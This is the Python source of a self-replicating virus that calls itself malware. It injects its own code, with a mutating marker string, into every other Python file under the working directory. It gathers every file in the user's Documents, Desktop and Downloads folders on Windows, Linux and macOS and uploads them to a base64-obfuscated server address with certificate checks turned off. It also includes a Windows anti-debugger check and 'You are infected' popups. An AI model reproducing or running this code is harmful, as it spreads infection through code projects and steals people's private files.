import platform
import os
import time
import ctypes
import random
import base64
import subprocess
import tkinter as tk
from tkinter import messagebox
import requests
import warnings
from urllib3.exceptions import InsecureRequestWarning

# Suppress InsecureRequestWarnings
warnings.simplefilter('ignore', InsecureRequestWarning)

# Root genetic sequence
CURRENT_SEQUENCE = "1234567890abcdef"

# Obfuscated server URL for exfiltration (base64 encoded)
encoded_server_url = "aHR0cHM6Ly8xOTIuMTY4LjEwMC41OjQ0NDMvbG9n"

# Decode URL at runtime
server_url = base64.b64decode(encoded_server_url).decode('utf-8')


start_time = time.time()


def anti_debugger():
    """Detects if the script is running under a debugger."""
    if ctypes.windll.kernel32.IsDebuggerPresent():
        exit(1)


def mutate_sequence(sequence):
    """Randomly mutates one character in the genetic sequence."""
    sequence_list = list(sequence)
    characters = '1234567890abcdef'

    mutate_pos = random.randint(0, len(sequence) - 1)
    current_char = sequence_list[mutate_pos]
    new_char = random.choice([char for char in characters if char != current_char])
    sequence_list[mutate_pos] = new_char

    return ''.join(sequence_list)


def check_for_sequence_in_file(target_path):
    """Checks if the target file contains the CURRENT_SEQUENCE variable."""
    try:
        with open(target_path, 'r') as file:
            return "CURRENT_SEQUENCE" in file.read()
    except Exception:
        return True  # Assume the file contains the sequence if it can't be read


def merge_code(self_code, target_path, sequence, parent_sequence):
    """Merges the current script's code with the existing code in the target file."""
    with open(target_path, 'r') as target_file:
        original_code = target_file.read()

    new_code = f"{self_code}\n\n# Old code below:\n{original_code}"
    with open(target_path, 'w') as target_file:
        target_file.write(new_code)


def replace_sequence_in_self_code(self_code, new_sequence, parent_sequence):
    """Replaces the CURRENT_SEQUENCE in the code and adds the parent sequence."""
    lines = self_code.splitlines()
    new_lines = []
    sequence_replaced = False

    for line in lines:
        if line.startswith("CURRENT_SEQUENCE = "):
            new_lines.append(f"CURRENT_SEQUENCE = \"{new_sequence}\"")
            new_lines.append(f"# Parent sequence: {parent_sequence}")
            sequence_replaced = True
        else:
            new_lines.append(line)

    if not sequence_replaced:
        new_lines.insert(0, f"CURRENT_SEQUENCE = \"{new_sequence}\"")
        new_lines.insert(1, f"# Parent sequence: {parent_sequence}")

    return "\n".join(new_lines)


def copy_self_to_other_files(directory, self_path):
    """Copies the current script's code into all other Python files in the directory."""
    global CURRENT_SEQUENCE

    with open(self_path, 'r') as self_file:
        self_code = self_file.read()

    parent_sequence = CURRENT_SEQUENCE
    CURRENT_SEQUENCE = mutate_sequence(CURRENT_SEQUENCE)
    self_code = replace_sequence_in_self_code(self_code, CURRENT_SEQUENCE, parent_sequence)

    shebang = "#!/usr/bin/env python3\n\n"
    self_code = f"{shebang}{self_code}"

    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".py") and file != os.path.basename(self_path):
                target_path = os.path.join(root, file)
                if not check_for_sequence_in_file(target_path):
                    merge_code(self_code, target_path, CURRENT_SEQUENCE, parent_sequence)


def show_popup_linux():
    """Displays a popup message on Linux using Zenity or Tkinter."""
    try:
        subprocess.run(
            ["zenity", "--info", "--text=You are infected with the malware!", "--title=Malware Alert"],
            check=True,
            stderr=open(os.devnull, 'w')
        )
    except FileNotFoundError:
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo("Malware Alert", "You are infected with the malware!")


def show_popup_windows():
    """Displays a popup message on Windows."""
    ctypes.windll.user32.MessageBoxW(0, "You are infected with the malware!", "Malware Alert", 1)


def show_popup_macos():
    """Displays a popup message on macOS using AppleScript."""
    script = 'display dialog "You are infected with the malware!" with title "Malware Alert" buttons {"OK"}'
    subprocess.run(["osascript", "-e", script])


def find_files_to_exfiltrate():
    """Finds files in key locations depending on the OS."""
    files_to_exfiltrate = []

    key_locations = {
        "Windows": [
            os.path.expandvars(r"%USERPROFILE%\Documents"),
            os.path.expandvars(r"%USERPROFILE%\Desktop"),
            os.path.expandvars(r"%USERPROFILE%\Downloads")
        ],
        "Linux": [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads")
        ],
        "Darwin": [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads")
        ]
    }

    os_name = platform.system()
    locations = key_locations.get(os_name, [])

    for location in locations:
        if os.path.exists(location):
            for root, dirs, files in os.walk(location):
                for file in files:
                    file_path = os.path.join(root, file)
                    files_to_exfiltrate.append(file_path)

    return files_to_exfiltrate


def exfiltrate_files(files):
    """Exfiltrates files to the server."""
    for file in files:
        try:
            with open(file, 'rb') as f:
                files = {'log': (os.path.basename(file), f)}
                requests.post(server_url, files=files, verify=False, timeout=10)
        except Exception:
            pass


def main():
    """Main function to detect the OS and execute the malware functionality."""
    os_name = platform.system()

    if os_name == "Windows":
        anti_debugger()
        show_popup_windows()
    elif os_name == "Linux":
        show_popup_linux()
    elif os_name == "Darwin":
        show_popup_macos()
    else:
        exit(1)

    current_directory = os.getcwd()
    self_path = os.path.realpath(__file__)
    copy_self_to_other_files(current_directory, self_path)

    files = find_files_to_exfiltrate()
    if files:
        exfiltrate_files(files)

    if time.time() - start_time > 5:
        exit(1)

if __name__ == "__main__":
    main()
